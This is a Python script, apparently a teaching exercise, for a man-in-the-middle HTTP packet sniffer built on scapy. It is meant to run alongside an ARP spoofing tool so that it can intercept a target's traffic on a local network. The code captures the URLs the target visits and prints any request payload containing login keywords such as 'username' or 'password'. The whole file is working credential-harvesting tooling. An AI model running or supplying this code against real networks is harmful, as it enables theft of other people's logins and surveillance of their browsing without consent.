"""
A program that acts as MITM (Man In The Middle) to sniff/capture data through 
http layer such as url, username, password, etc.

Packet Sniffer (Mainly http)

Capture data flowing through an interface.
Filter this data.
Display information such as:
    1. Login info (username, passwords)
    2. Visited websites
    3. Images
    ...
    
Caution: Running with arp_spoof.py at the same time. 

Required: 1. scapy library
             scapy can be used to:
                a) create packets
                b) analyse packets
                c) send/receive packets
             but it can't be used to intercept packets
          2. Scapy-http (Support for parsing HTTP in Scapy)
                sudo pip install scapy-http
        

ARP Spoof + Packet Sniffer:
    1. Target a computer on the same network
    2. arp_spoof to redirect flow of packets (become MITM (Man In The Middle))
    3. packet_sniffer to see URLs, usernames and passwords sent by target

"""
import scapy.all as scapy
from scapy.layers import http
import optparse


def get_arguments():
    # Get command line arguments
    """
    Get the name of interface.

    :return: name of the interface,
    :rtype: str
    """
    parser = optparse.OptionParser()

    # Get the name of intergace from user input
    parser.add_option("-i", "--interface", dest="interface",
                      help="Interface to change its MAC Address")

    (options, arguments) = parser.parse_args()

    # Code to handle error
    if not options.interface:
        parser.error(
            "[-] Please specify an interface, use --help for more info.")

    return options.interface


def sniff(interface):
    """
    Use the interface to sinff and capture data. (MITM)

    :param interface: THe name of the interface that we will be sniffing and 
                      capturing data from
    :type interface: str
    """
    # iface: name of the interface
    # store: wheter store sniffed data into memory or not
    # prn: callback function
    # filter (optional): filter packet
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    """
    Get the url of the webstie that the target computer is visiting.

    :param packet: The sniffed packet
    :type packet: packet
    :return: The url of a webstie
    :rtype: str
    """
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    # looking for raw layer
    """

    :param packet: The sniffed packet
    :type packet: packet
    :return: sniffed login information
    :rtype: str
    """
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        # looking for username and password
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    # looking for http layer
    """

    :param packet: The sniffed packet
    :type packet: packet
    """
    if packet.haslayer(http.HTTPRequest):
        # looking for url (the website that the user visited)
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)
        # looking for login information
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possibel username/password >> " + login_info +
                  "\n\n")


if __name__ == "__main__":
    input_interface = get_arguments()
    sniff(input_interface)
